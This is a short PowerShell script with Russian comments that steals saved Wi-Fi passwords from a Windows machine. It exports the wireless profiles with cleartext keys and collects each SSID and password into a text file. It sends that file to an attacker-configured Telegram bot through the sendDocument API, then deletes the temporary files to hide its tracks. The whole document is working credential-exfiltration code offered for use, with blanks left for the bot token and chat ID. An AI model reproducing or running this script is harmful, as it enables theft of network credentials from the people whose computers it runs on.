# Конфигурация Telegram бота
$BotToken = ""  # <-- ЗАМЕНИТЕ на ваш API токен от BotFather
$ChatID = ""          # <-- ЗАМЕНИТЕ на ваш Chat ID

# Извлекаем пароли и создаем файл
$TempDir = "$env:temp\wifi-passwords"
New-Item -ItemType Directory -Path $TempDir -Force | Out-Null
Set-Location $TempDir

netsh wlan export profile key=clear | Out-Null

$OutputFile = "$env:USERPROFILE\Downloads\info123.txt"
"Сохраненные пароли Wi-Fi`n" > $OutputFile
"=========================`n" >> $OutputFile

Get-ChildItem -Path "*.xml" | ForEach-Object {
    $XmlData = [xml](Get-Content $_.FullName)
    $SSID = $XmlData.WLANProfile.SSIDConfig.SSID.Name
    $Password = $XmlData.WLANProfile.MSM.Security.SharedKey.KeyMaterial
    "SSID: $SSID`nПароль: $Password`n" >> $OutputFile
    Remove-Item $_.FullName
}

# Отправляем файл в Telegram
$TelegramAPIUrl = "https://api.telegram.org/bot$BotToken/sendDocument"

$File = Get-Item -Path $OutputFile

$Form = @{
    chat_id = $ChatID
    document = Get-Item -Path $OutputFile
}

try {
    Invoke-RestMethod -Uri $TelegramAPIUrl -Form $Form -Method Post | Out-Null
} catch {
    # Ошибка отправки
}

# Удаляем временную директорию и файл
Remove-Item $TempDir -Recurse -Force -ErrorAction SilentlyContinue
Remove-Item $OutputFile -Force -ErrorAction SilentlyContinue
